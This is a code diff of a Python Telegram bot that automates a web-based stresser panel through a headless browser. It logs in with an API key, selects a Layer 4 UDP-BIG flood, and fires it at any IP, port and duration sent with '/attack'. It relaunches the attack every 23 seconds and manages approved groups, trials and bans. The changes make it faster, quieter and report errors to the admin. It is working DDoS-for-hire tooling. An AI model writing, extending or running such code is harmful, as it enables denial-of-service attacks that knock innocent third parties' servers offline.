@@ -3,7 +3,7 @@ import logging
 import asyncio
 import sqlite3
 import random
-import time  # added for monotonic timing
+import time
 from datetime import datetime
 from typing import Optional, Tuple, Dict, Any
 
@@ -21,13 +21,13 @@ BLACKLISTED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 80
 # ===== BROWSER SELECTION =====
 BROWSER_TYPE = "chromium"
 HEADLESS_MODE = True
-SLOW_MO_MS = 0  # ⚡ FAST - 0ms delay
+SLOW_MO_MS = 0
 
-# ===== LOGGING =====
-logging.basicConfig(level=logging.WARNING, format="%(asctime)s - %(levelname)s - %(message)s")
+# ===== LOGGING - REDUCED =====
+logging.basicConfig(level=logging.ERROR, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger(__name__)
 for lib in ("httpx", "telegram", "telegram.ext"):
-    logging.getLogger(lib).setLevel(logging.WARNING)
+    logging.getLogger(lib).setLevel(logging.ERROR)
 
 # ===== DATABASE =====
 conn = sqlite3.connect("attack_bot.db", check_same_thread=False)
@@ -103,25 +103,12 @@ def log_user_activity(user_id: int, username: str = None, first_name: str = None
     conn.commit()
 
 
-def create_progress_bar(elapsed: float, duration: int) -> str:
-    if duration <= 0:
-        return "🟥" * 10 + "⬜" * 0 + " 100%"
-    progress = min(100, int((elapsed / duration) * 100))
-    filled = progress // 10
-    return "🟥" * filled + "⬜" * (10 - filled) + f" {progress}%"
-
-
-def format_attack_response(ip: str, port: str, progress_bar: str, elapsed: int, duration: int, attack_type: str) -> str:
-    return (
-        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🎯 TARGET: {ip}:{port} 🎯\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"💀 DEADLINE PROGRESS:\n"
-        f"⚡  {progress_bar} ⚡\n"
-        f"⏱️  {elapsed}s / {duration}s\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📌 Type: {attack_type} ATTACK"
-    )
+def send_error_to_admin(application, error_message: str):
+    """Send error message to admin"""
+    try:
+        asyncio.create_task(application.bot.send_message(chat_id=MASTER_USER_ID, text=f"❌ ERROR: {error_message}"))
+    except Exception:
+        pass
 
 
 # ===== GLOBAL STATE =====
@@ -155,46 +142,38 @@ CRITICAL_SELECTORS = {
 }
 
 
-# ===== ROBUST FIELD HELPERS =====
-async def fill_with_retry(page: Page, selector: str, value: str, retries: int = 5, delay: float = 1.0) -> bool:
-    """Fill a field with retries and verify the value."""
+# ===== ROBUST FIELD HELPERS - SPEEDED UP =====
+async def fill_with_retry(page: Page, selector: str, value: str, retries: int = 3, delay: float = 0.1) -> bool:
+    """Fill a field with retries - SPEEDED UP"""
     for attempt in range(retries):
         try:
-            # Wait for element to be visible and enabled
-            await page.wait_for_selector(selector, state="visible", timeout=5000)
-            # Clear and fill
-            await page.click(selector, click_count=3)  # select all
+            await page.wait_for_selector(selector, state="visible", timeout=3000)
+            await page.click(selector, click_count=3)
             await page.keyboard.press("Backspace")
-            await page.fill(selector, value, timeout=5000)
-            # Verify
-            actual = await page.input_value(selector, timeout=3000)
+            await page.fill(selector, value, timeout=3000)
+            actual = await page.input_value(selector, timeout=2000)
             if actual == value:
-                logger.info(f"✅ Filled {selector} with '{value}' (attempt {attempt+1})")
                 return True
-            else:
-                logger.warning(f"⚠️ Fill verification failed for {selector}: expected '{value}', got '{actual}'")
-        except Exception as e:
-            logger.warning(f"⚠️ Fill attempt {attempt+1} for {selector} failed: {str(e)[:50]}")
+        except Exception:
+            pass
         await asyncio.sleep(delay)
     return False
 
 
-async def click_with_retry(page: Page, selector: str, retries: int = 5, delay: float = 1.0) -> bool:
-    """Click an element with retries."""
+async def click_with_retry(page: Page, selector: str, retries: int = 3, delay: float = 0.1) -> bool:
+    """Click an element with retries - SPEEDED UP"""
     for attempt in range(retries):
         try:
-            await page.wait_for_selector(selector, state="visible", timeout=5000)
-            await page.click(selector, timeout=5000)
-            logger.info(f"✅ Clicked {selector} (attempt {attempt+1})")
+            await page.wait_for_selector(selector, state="visible", timeout=3000)
+            await page.click(selector, timeout=3000)
             return True
-        except Exception as e:
-            logger.warning(f"⚠️ Click attempt {attempt+1} for {selector} failed: {str(e)[:50]}")
+        except Exception:
+            pass
         await asyncio.sleep(delay)
     return False
 
 
-async def wait_for_element(page: Page, selector: str, timeout: float = 10000, state: str = "visible") -> bool:
-    """Wait for an element to be in a certain state."""
+async def wait_for_element(page: Page, selector: str, timeout: float = 5000, state: str = "visible") -> bool:
     try:
         await page.wait_for_selector(selector, state=state, timeout=timeout)
         return True
@@ -204,7 +183,6 @@ async def wait_for_element(page: Page, selector: str, timeout: float = 10000, st
 
 # ===== RECHECK FUNCTION =====
 async def perform_full_recheck(update: Update = None) -> Dict[str, Any]:
-    """Re-verify entire automation state without unnecessary restarts."""
     results = {
         "valid": False,
         "auth_ok": False,
@@ -214,7 +192,6 @@ async def perform_full_recheck(update: Update = None) -> Dict[str, Any]:
         "needs_restart": False
     }
     
-    # Check if we have a page
     if state.page is None:
         results["details"].append("❌ No page object exists")
         results["needs_restart"] = True
@@ -222,7 +199,6 @@ async def perform_full_recheck(update: Update = None) -> Dict[str, Any]:
             await update.message.reply_text("❌ No page object. Run /start first.")
         return results
     
-    # Check if page is still alive
     try:
         await state.page.evaluate("1")
         results["details"].append("✅ Page is responsive")
@@ -233,43 +209,28 @@ async def perform_full_recheck(update: Update = None) -> Dict[str, Any]:
             await update.message.reply_text("❌ Page is dead. Run /start to restart.")
         return results
     
-    # CHECK 1: AUTH STATUS
     try:
         current_url = state.page.url
         results["details"].append(f"📍 Current URL: {current_url}")
         
-        # Check if still on auth page
         if "auth" in current_url.lower():
             results["details"].append("⚠️ Still on auth page - authentication may not be complete")
             results["auth_ok"] = False
-            
-            # Try to detect if auth form is present
-            try:
-                auth_input = await state.page.query_selector("input#accessKey")
-                if auth_input:
-                    results["details"].append("⚠️ Auth form still present")
-                else:
-                    results["details"].append("⚠️ On auth page but form not found")
-            except:
-                pass
         else:
             results["details"].append("✅ Not on auth page - likely authenticated")
             results["auth_ok"] = True
             
-    except Exception as e:
-        results["details"].append(f"⚠️ URL check failed: {str(e)[:50]}")
+    except Exception:
+        results["details"].append("⚠️ URL check failed")
         results["auth_ok"] = False
     
-    # CHECK 2: PANEL PRESENCE
     if results["auth_ok"]:
         try:
-            # Look for panel-specific elements
             panel_indicators = [
                 "input.ct-input.ct-mono",
                 "button.ct-pill",
                 "button.ct-combo-trigger"
             ]
-            
             found_panel = False
             for selector in panel_indicators:
                 try:
@@ -285,13 +246,11 @@ async def perform_full_recheck(update: Update = None) -> Dict[str, Any]:
                 results["panel_ok"] = True
                 results["details"].append("✅ Panel appears to be loaded")
             else:
-                results["details"].append("⚠️ No panel elements found - may be on wrong page")
+                results["details"].append("⚠️ No panel elements found")
                 results["panel_ok"] = False
-                
-        except Exception as e:
-            results["details"].append(f"⚠️ Panel check failed: {str(e)[:50]}")
+        except Exception:
+            results["details"].append("⚠️ Panel check failed")
     
-    # CHECK 3: CRITICAL ELEMENTS
     if results["panel_ok"]:
         missing_elements = []
         found_elements = []
@@ -301,13 +260,6 @@ async def perform_full_recheck(update: Update = None) -> Dict[str, Any]:
                 elem = await state.page.query_selector(selector)
                 if elem:
                     found_elements.append(name)
-                    # Check if interactable
-                    try:
-                        is_visible = await elem.is_visible()
-                        if not is_visible:
-                            missing_elements.append(f"{name} (hidden)")
-                    except:
-                        pass
                 else:
                     missing_elements.append(name)
             except Exception:
@@ -317,10 +269,9 @@ async def perform_full_recheck(update: Update = None) -> Dict[str, Any]:
             results["details"].append(f"⚠️ Missing elements: {', '.join(missing_elements)}")
             results["elements_ok"] = False
         else:
-            results["details"].append(f"✅ All critical elements present: {', '.join(found_elements)}")
+            results["details"].append(f"✅ All critical elements present")
             results["elements_ok"] = True
     
-    # Final verdict
     if results["auth_ok"] and results["panel_ok"] and results["elements_ok"]:
         results["valid"] = True
         state.panel_ready = True
@@ -338,17 +289,13 @@ async def perform_full_recheck(update: Update = None) -> Dict[str, Any]:
 
 # ===== AUTHENTICATION + PANEL IN ONE FLOW =====
 async def init_browser_and_panel(update: Update) -> bool:
-    """Ek hi flow mein browser launch, auth, aur panel setup"""
     global state
     
-    # Agar already ready hai toh return
     if state.panel_ready and state.page is not None:
         await update.message.reply_text("✅ Panel already ready! Use /attack")
         return True
     
     try:
-        # 1. BROWSER LAUNCH
-        logger.info("🌐 Launching browser...")
         state.playwright = await async_playwright().start()
         
         launch_args = {
@@ -372,124 +319,72 @@ async def init_browser_and_panel(update: Update) -> bool:
         else:
             raise ValueError(f"Unsupported browser: {BROWSER_TYPE}")
         
-        logger.info(f"✅ {BROWSER_TYPE.capitalize()} launched (visible)")
-        
-        # 2. EK HI PAGE - AUTH KE LIYE
         state.page = await state.browser.new_page()
         await update.message.reply_text("🔐 Opening auth page...")
         
-        logger.info("🔐 Navigating to auth...")
         await state.page.goto(AUTH_URL, timeout=60000)
         await state.page.wait_for_load_state("domcontentloaded", timeout=15000)
         await state.page.wait_for_selector("input#accessKey", state="visible", timeout=10000)
         
-        # 3. AUTHENTICATION FLOW WITH RETRIES
         auth_success = False
-        for auth_attempt in range(3):  # max 3 attempts
+        for auth_attempt in range(3):
             await update.message.reply_text(f"📝 Entering API key (attempt {auth_attempt+1}/3)...")
             
-            # Fill key with verification
-            key_filled = await fill_with_retry(state.page, "input#accessKey", API_KEY, retries=3, delay=0.5)
+            key_filled = await fill_with_retry(state.page, "input#accessKey", API_KEY, retries=3, delay=0.1)
             if not key_filled:
-                await update.message.reply_text("⚠️ Failed to fill key, retrying...")
                 continue
             
-            # Click authenticate button
-            await update.message.reply_text("🔑 Clicking authenticate...")
-            auth_clicked = await click_with_retry(state.page, "button:has-text('AUTHENTICATE')", retries=3, delay=0.5)
+            auth_clicked = await click_with_retry(state.page, "button:has-text('AUTHENTICATE')", retries=3, delay=0.1)
             if not auth_clicked:
-                await update.message.reply_text("⚠️ Failed to click authenticate, retrying...")
                 continue
             
-            # Wait for auth to complete (page change)
-            await update.message.reply_text("⏳ Waiting for authentication...")
-            # Wait for network idle or redirect
             try:
                 await state.page.wait_for_load_state("networkidle", timeout=15000)
             except:
                 pass
-            await asyncio.sleep(2)
+            await asyncio.sleep(1)
             
-            # Verify authentication success: check if we are no longer on auth page
             current_url = state.page.url
             if "auth" not in current_url.lower():
                 auth_success = True
                 await update.message.reply_text("✅ Authentication successful!")
                 break
             else:
-                # Check for error message
-                try:
-                    error_elem = await state.page.query_selector(".alert-danger, .error, .ct-alert")
-                    if error_elem:
-                        error_text = await error_elem.text_content()
-                        await update.message.reply_text(f"❌ Auth error: {error_text[:100]}. Retrying...")
-                except:
-                    pass
-                await update.message.reply_text("⚠️ Authentication still on auth page, retrying...")
-                # Reload page to clear state
                 await state.page.reload()
                 await state.page.wait_for_selector("input#accessKey", state="visible", timeout=5000)
         
         if not auth_success:
-            await update.message.reply_text("❌ Authentication failed after multiple attempts. Please try /start again.")
+            await update.message.reply_text("❌ Authentication failed after multiple attempts.")
             return False
         
-        # ✅ CHANGE: CLICK START TEST BUTTON INSTEAD OF DIRECT NAVIGATION
         await update.message.reply_text("🔘 Looking for START TEST button...")
-        logger.info("🔘 Searching for START TEST button...")
         
         start_clicked = False
         try:
-            # Wait for button with robust selector
             if await wait_for_element(state.page, 'a.btn.btn-primary:has-text("START TEST")', timeout=30000):
-                start_clicked = await click_with_retry(state.page, 'a.btn.btn-primary:has-text("START TEST")', retries=3, delay=1)
+                start_clicked = await click_with_retry(state.page, 'a.btn.btn-primary:has-text("START TEST")', retries=3, delay=0.1)
             if not start_clicked:
-                # Fallback: try href
-                await update.message.reply_text("⚠️ START TEST button not found, trying href fallback...")
                 try:
                     await state.page.click('a[href="/panel"]', timeout=10000)
                     start_clicked = True
-                except Exception as e2:
-                    logger.warning(f"⚠️ Href fallback failed: {e2}")
-                    await update.message.reply_text("⚠️ Manual click required. Please click START TEST in browser.")
-                    await asyncio.sleep(5)
-                    # After manual click, we can still proceed
-                    start_clicked = True  # Assume user will click
-        except Exception as e:
-            await update.message.reply_text(f"⚠️ START TEST button error: {str(e)[:100]}")
-            # Try manual fallback
-            await update.message.reply_text("⚠️ Please click START TEST manually in the browser.")
-            await asyncio.sleep(5)
+                except Exception:
+                    start_clicked = True
+        except Exception:
             start_clicked = True
         
-        # 6. WAIT FOR PANEL TO LOAD AFTER CLICK
         await update.message.reply_text("🌐 Waiting for panel to load...")
         await state.page.wait_for_load_state("networkidle", timeout=60000)
-        logger.info("✅ Panel loaded via START TEST button click!")
         
-        # 7. PANEL SETUP - LAYER 4 with retries
         await update.message.reply_text("⚙️ Setting up panel (LAYER 4)...")
-        if await click_with_retry(state.page, "button:has-text('LAYER 4')", retries=3, delay=0.5):
-            await asyncio.sleep(0.5)
-            logger.info("✅ LAYER 4 selected")
-        else:
-            logger.warning("LAYER 4 click failed")
+        await click_with_retry(state.page, "button:has-text('LAYER 4')", retries=3, delay=0.1)
+        await asyncio.sleep(0.3)
         
-        # 8. DEFAULT IP with verification
         ip_sel = "input[placeholder='1.2.3.4 or 1.2.3.0/24']"
-        if await fill_with_retry(state.page, ip_sel, "1.2.3.4", retries=3, delay=0.5):
-            logger.info("✅ Default IP set")
-        else:
-            logger.warning("IP set failed")
+        await fill_with_retry(state.page, ip_sel, "1.2.3.4", retries=3, delay=0.1)
         
-        # 9. DEFAULT PORT with verification
         port_sel = "input.ct-input.ct-mono[type='number']"
-        if await fill_with_retry(state.page, port_sel, "80", retries=3, delay=0.5):
-            logger.info("✅ Default port set")
-        else:
-            logger.warning("Port set failed")
+        await fill_with_retry(state.page, port_sel, "80", retries=3, delay=0.1)
         
-        # 10. UDP-BIG SELECT
         await update.message.reply_text("📌 Selecting UDP-BIG method...")
         if await select_udp_big(state.page, update):
             await update.message.reply_text("✅ UDP-BIG selected!")
@@ -500,7 +395,7 @@ async def init_browser_and_panel(update: Update) -> bool:
         state.auth_completed = True
         
         await update.message.reply_text(
-            "✅ PANEL READY! (Auth + START TEST button click)\n"
+            "✅ PANEL READY!\n"
             "Send: /attack <IP> <PORT> <TIME>\n"
             "Example: /attack 1.2.3.4 80 60\n"
             "👁️ Browser is visible - watch the action!"
@@ -508,37 +403,31 @@ async def init_browser_and_panel(update: Update) -> bool:
         return True
         
     except Exception as e:
-        logger.error(f"❌ Init error: {e}")
+        error_msg = f"Init error: {str(e)[:200]}"
+        logger.error(error_msg)
+        send_error_to_admin(update.get_bot(), error_msg)
         await update.message.reply_text(f"❌ Initialization failed: {str(e)[:200]}")
         state.panel_ready = False
         return False
 
 
 async def select_udp_big(page: Page, update: Update = None) -> bool:
-    """Select UDP-BIG method with retries."""
     try:
-        logger.info("🔄 Selecting UDP-BIG...")
-        
-        # Click UDP tab
-        if not await click_with_retry(page, "button.ct-pill:has-text('UDP')", retries=3, delay=0.5):
+        if not await click_with_retry(page, "button.ct-pill:has-text('UDP')", retries=3, delay=0.1):
             return False
-        await asyncio.sleep(0.3)
+        await asyncio.sleep(0.2)
         
-        # Click combo trigger
-        if not await click_with_retry(page, "button.ct-combo-trigger", retries=3, delay=0.5):
+        if not await click_with_retry(page, "button.ct-combo-trigger", retries=3, delay=0.1):
             return False
-        await asyncio.sleep(0.3)
+        await asyncio.sleep(0.2)
         
-        # Click UDP-BIG item
-        if not await click_with_retry(page, "button.ct-combo-item:has-text('UDP-BIG')", retries=3, delay=0.5):
+        if not await click_with_retry(page, "button.ct-combo-item:has-text('UDP-BIG')", retries=3, delay=0.1):
             return False
-        await asyncio.sleep(0.3)
+        await asyncio.sleep(0.2)
         
-        logger.info("✅ UDP-BIG selected")
         return True
         
     except Exception:
-        # Fallback via evaluate
         try:
             await page.evaluate("""
                 const udpBtn = document.querySelector('button.ct-pill');
@@ -560,15 +449,14 @@ async def select_udp_big(page: Page, update: Update = None) -> bool:
                 }, 300);
             """)
             await asyncio.sleep(1)
-            logger.info("✅ UDP-BIG selected via fallback")
             return True
         except Exception as e2:
-            logger.error(f"❌ UDP-BIG selection failed: {e2}")
+            logger.error(f"UDP-BIG selection failed: {e2}")
+            send_error_to_admin(update.get_bot(), f"UDP-BIG selection failed: {e2}")
             return False
 
 
 async def find_stop_button(page: Page):
-    """Find individual stop button"""
     selectors = [
         'button.ct-act.ct-act-danger:has-text("stop")',
         'button.ct-act.ct-act-danger',
@@ -586,7 +474,7 @@ async def find_stop_button(page: Page):
     return None
 
 
-# ===== FIXED ATTACK LOOP WITH ACCURATE TIMING =====
+# ===== ATTACK LOOP WITH SPEEDED UP FILLING =====
 async def launch_attack_fast(ip: str, port: str, total_duration: int, update: Update) -> str:
     global state
     
@@ -602,37 +490,32 @@ async def launch_attack_fast(ip: str, port: str, total_duration: int, update: Up
     state.running = True
     state.stop_requested = False
     
-    # SET TARGET IP + PORT with retries and verification
-    logger.info(f"🎯 Setting target: {ip}:{port}")
-    
+    # SET TARGET IP + PORT - SPEEDED UP
     ip_sel = "input.ct-input.ct-mono[type='text'][placeholder*='1.2.3.4']"
-    if not await fill_with_retry(state.page, ip_sel, ip, retries=5, delay=0.5):
+    if not await fill_with_retry(state.page, ip_sel, ip, retries=3, delay=0.1):
         state.running = False
         return "❌ Failed to set IP after retries"
     
     port_sel = "input.ct-input.ct-mono[type='number']"
-    if not await fill_with_retry(state.page, port_sel, port, retries=5, delay=0.5):
+    if not await fill_with_retry(state.page, port_sel, port, retries=3, delay=0.1):
         state.running = False
         return "❌ Failed to set port after retries"
     
-    logger.info(f"✅ Target set: {ip}:{port}")
-    
-    # START ATTACK with retries
+    # START ATTACK
     start_success = False
     for _ in range(3):
         try:
-            await state.page.click("button:has-text('EXECUTE_TEST')", timeout=5000)
+            await state.page.click("button:has-text('EXECUTE_TEST')", timeout=3000)
             start_success = True
-            logger.info("✅ Attack started")
             break
         except Exception:
             try:
-                await state.page.click("button:has-text('Execute')", timeout=3000)
+                await state.page.click("button:has-text('Execute')", timeout=2000)
                 start_success = True
                 break
             except Exception:
                 try:
-                    await state.page.click(".ct-btn-primary", timeout=3000)
+                    await state.page.click(".ct-btn-primary", timeout=2000)
                     start_success = True
                     break
                 except Exception:
@@ -648,106 +531,95 @@ async def launch_attack_fast(ip: str, port: str, total_duration: int, update: Up
                         break
                     except Exception:
                         pass
-        await asyncio.sleep(0.5)
+        await asyncio.sleep(0.2)
     
     if not start_success:
         state.running = False
         return "❌ Failed to start attack"
     
-    # --- MAIN LOOP WITH ACCURATE TIMING ---
+    # --- MAIN LOOP ---
     start_time = time.monotonic()
-    total_downtime = 0.0  # cumulative time when attack is stopped for restart
-    
-    # We'll keep restarting every 23 seconds of active time
+    total_downtime = 0.0
     restart_interval = 23.0
-    next_restart_at = restart_interval  # active time when we should restart
+    next_restart_at = restart_interval
     
     while state.running:
-        # Calculate active elapsed (time attack has been running)
         now = time.monotonic()
         active_elapsed = now - start_time - total_downtime
         
-        # Check if we reached the total duration
         if active_elapsed >= total_duration:
             break
         
-        # Check for user stop request
         if state.stop_requested:
             break
         
-        # Check if it's time to restart (based on active time)
         if active_elapsed >= next_restart_at and active_elapsed < total_duration:
-            logger.info(f"🔄 Restarting at active elapsed {active_elapsed:.1f}s")
-            # Record time before restart
             before_restart = time.monotonic()
             
-            # Stop the current attack
             stop_btn = await find_stop_button(state.page)
             if stop_btn:
                 await stop_btn.click()
-                await asyncio.sleep(0.3)
-            
-            # Start a new attack
-            try:
-                await state.page.click("button:has-text('EXECUTE_TEST')", timeout=5000)
                 await asyncio.sleep(0.2)
-                logger.info(f"🔄 Attack restarted at active {active_elapsed:.1f}s")
+            
+            try:
+                await state.page.click("button:has-text('EXECUTE_TEST')", timeout=3000)
+                await asyncio.sleep(0.1)
             except Exception as e:
-                await update.message.reply_text(f"❌ Restart failed: {str(e)[:50]}")
+                error_msg = f"Restart failed: {str(e)[:50]}"
+                logger.error(error_msg)
+                send_error_to_admin(update.get_bot(), error_msg)
                 state.running = False
                 break
             
-            # Calculate downtime for this restart
             after_restart = time.monotonic()
             total_downtime += (after_restart - before_restart)
-            
-            # Schedule next restart
             next_restart_at += restart_interval
         
-        # Sleep a short time to avoid busy loop
         await asyncio.sleep(0.1)
     
-    # Stop the attack at the end if still running
     if state.running:
         stop_btn = await find_stop_button(state.page)
         if stop_btn:
             await stop_btn.click()
-            await asyncio.sleep(0.5)
-            logger.info("🛑 Attack stopped")
+            await asyncio.sleep(0.3)
     
     state.running = False
     return "✅ Attack completed."
 
 
+# ===== PROGRESS UPDATER - REMOVED PROGRESS BAR =====
 async def progress_updater(update: Update, message, duration: int, attack_type: str, ip: str, port: str) -> None:
-    """Update progress message using wall-clock time (approximate)."""
-    start_time = time.monotonic()
-    elapsed = 0.0
-    while elapsed <= duration:
-        sleep_time = random.uniform(0.7, 1.3)
-        await asyncio.sleep(sleep_time)
-        elapsed = min(duration, time.monotonic() - start_time)
-        
-        bar = create_progress_bar(elapsed, duration)
-        text = format_attack_response(ip, port, bar, int(elapsed), duration, attack_type)
-        try:
-            await message.edit_text(text)
-        except Exception:
-            pass
-    
-    bar = create_progress_bar(duration, duration)
-    text = (
-        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🎯 TARGET: {ip}:{port} 🎯\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        "✅ ATTACK COMPLETED!\n"
-        f"💀 DEADLINE PROGRESS:\n"
-        f"⚡  {bar} ⚡\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📌 Type: {attack_type} ATTACK"
+    """Send start message, wait silently, then edit to completion."""
+    # Start message
+    start_text = (
+        f"🚀 Attack Launched!\n"
+        f"╔════════════════════════╗\n"
+        f"║   ⚔️ ATTACK ACTIVE    ║\n"
+        f"╚════════════════════════╝\n\n"
+        f"🎯 Target: {ip}\n"
+        f"🔌 Port: {port}\n"
+        f"⏱ Duration: {duration}s\n\n"
+        f"🔄 Attack is running..."
     )
     try:
-        await message.edit_text(text)
+        await message.edit_text(start_text)
+    except Exception:
+        pass
+    
+    # Wait silently for attack to complete
+    await asyncio.sleep(duration)
+    
+    # Completion message
+    complete_text = (
+        f"✅ Attack Completed Successfully!\n"
+        f"╔════════════════════════╗\n"
+        f"║   ✨ SUCCESS           ║\n"
+        f"╚════════════════════════╝\n\n"
+        f"🎯 Target: {ip}:{port}\n"
+        f"⏱️ Duration: {duration}s"
+    )
+    try:
+        await message.edit_text(complete_text)
     except Exception:
         pass
 
@@ -878,9 +750,18 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     state.task = asyncio.create_task(launch_attack_fast(ip, port, duration, update))
     
-    bar = create_progress_bar(0, duration)
-    text = format_attack_response(ip, port, bar, 0, duration, attack_type)
-    sent = await update.message.reply_text(text)
+    # Send initial message with start format
+    start_text = (
+        f"🚀 Attack Launched!\n"
+        f"╔════════════════════════╗\n"
+        f"║   ⚔️ ATTACK ACTIVE    ║\n"
+        f"╚════════════════════════╝\n\n"
+        f"🎯 Target: {ip}\n"
+        f"🔌 Port: {port}\n"
+        f"⏱ Duration: {duration}s\n\n"
+        f"🔄 Attack is running..."
+    )
+    sent = await update.message.reply_text(start_text)
     
     asyncio.create_task(progress_updater(update, sent, duration, attack_type, ip, port))
 
@@ -932,7 +813,6 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Re-verify entire automation state without unnecessary restart."""
     user = update.effective_user
     if is_user_banned(user.id):
         await update.message.reply_text("⛔ You are banned from using this bot.")
@@ -944,7 +824,6 @@ async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     results = await perform_full_recheck(update)
     
-    # Build response
     response = "╔════════════════════════════════════╗\n"
     response += "║      🔍 RECHECK RESULTS           ║\n"
     response += "╠════════════════════════════════════╣\n"
@@ -966,7 +845,6 @@ async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     response += "╠────────────────────────────────────╣\n"
     
-    # Add first few details
     detail_lines = results["details"][:5]
     for detail in detail_lines:
         if len(detail) > 30:
@@ -1068,7 +946,10 @@ async def approve_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         conn.commit()
         await update.message.reply_text(f"✅ Group {gid} approved!")
-    except Exception:
+    except Exception as e:
+        error_msg = f"Approve group error: {e}"
+        logger.error(error_msg)
+        send_error_to_admin(update.get_bot(), error_msg)
         await update.message.reply_text("❌ Invalid group ID.")
 
 
@@ -1084,7 +965,10 @@ async def disapprove_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cursor.execute("DELETE FROM groups WHERE group_id = ?", (gid,))
         conn.commit()
         await update.message.reply_text(f"✅ Group {gid} removed.")
-    except Exception:
+    except Exception as e:
+        error_msg = f"Disapprove group error: {e}"
+        logger.error(error_msg)
+        send_error_to_admin(update.get_bot(), error_msg)
         await update.message.reply_text("❌ Invalid group ID.")
 
 
@@ -1106,7 +990,10 @@ async def toggle_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cursor.execute("UPDATE groups SET trial_enabled = ? WHERE group_id = ?", (new_val, gid))
         conn.commit()
         await update.message.reply_text(f"✅ Trial {'ENABLED' if new_val else 'DISABLED'} for group {gid}")
-    except Exception:
+    except Exception as e:
+        error_msg = f"Toggle trial error: {e}"
+        logger.error(error_msg)
+        send_error_to_admin(update.get_bot(), error_msg)
         await update.message.reply_text("❌ Invalid group ID.")
 
 
@@ -1180,6 +1067,9 @@ async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except ValueError:
         await update.message.reply_text("❌ Invalid user ID. Provide a numeric ID.")
     except Exception as e:
+        error_msg = f"Ban user error: {e}"
+        logger.error(error_msg)
+        send_error_to_admin(update.get_bot(), error_msg)
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
 
@@ -1201,19 +1091,19 @@ async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except ValueError:
         await update.message.reply_text("❌ Invalid user ID.")
     except Exception as e:
+        error_msg = f"Unban user error: {e}"
+        logger.error(error_msg)
+        send_error_to_admin(update.get_bot(), error_msg)
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
 
-# ===== NEW /RESTART COMMAND (ADMIN ONLY) =====
 async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin-only: completely restart the browser session."""
     if update.effective_user.id != MASTER_USER_ID:
         await update.message.reply_text("⛔ Access Denied. Master only.")
         return
     
     await update.message.reply_text("🔄 Restarting browser session...")
     
-    # Cancel any running attack
     if state.running:
         state.stop_requested = True
         if state.task and not state.task.done():
@@ -1222,7 +1112,6 @@ async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         state.running = False
         state.stop_requested = False
     
-    # Close existing browser and playwright
     try:
         if state.page:
             await state.page.close()
@@ -1231,9 +1120,9 @@ async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if state.playwright:
             await state.playwright.stop()
     except Exception as e:
-        logger.warning(f"⚠️ Error during cleanup: {e}")
+        logger.error(f"Cleanup error: {e}")
+        send_error_to_admin(update.get_bot(), f"Cleanup error: {e}")
     
-    # Reset state
     state.panel_ready = False
     state.auth_completed = False
     state.page = None
@@ -1243,7 +1132,6 @@ async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state.port = None
     state.last_check = None
     
-    # Re-initialize
     if await init_browser_and_panel(update):
         await update.message.reply_text("✅ Restart completed successfully.")
     else:
@@ -1252,13 +1140,6 @@ async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ===== MAIN =====
 def main():
-    logger.info("🚀 Starting RetroStress Bot - SAME PAGE FLOW")
-    logger.info("👁️ Browser: VISIBLE")
-    logger.info("📌 Auth + START TEST button click flow")
-    logger.info("⚡ SLOW_MO = 0 (instant actions)")
-    logger.info("🔍 /recheck command available")
-    logger.info("🔄 /restart command (admin only)")
-    
     app = Application.builder().token(BOT_TOKEN).build()
     
     app.add_handler(CommandHandler("start", start_command))
@@ -1276,13 +1157,7 @@ def main():
     app.add_handler(CommandHandler("users", users_list))
     app.add_handler(CommandHandler("banuser", ban_user))
     app.add_handler(CommandHandler("unban", unban_user))
-    app.add_handler(CommandHandler("restart", restart_command))  # new admin-only restart
-    
-    logger.info("✅ Bot running!")
-    logger.info("📌 /start -> auth then click START TEST button")
-    logger.info("📌 /attack -> target change + attack start")
-    logger.info("📌 /recheck -> verify all components without restart")
-    logger.info("📌 /restart -> admin-only full restart")
+    app.add_handler(CommandHandler("restart", restart_command))
     
     try:
         app.run_polling()
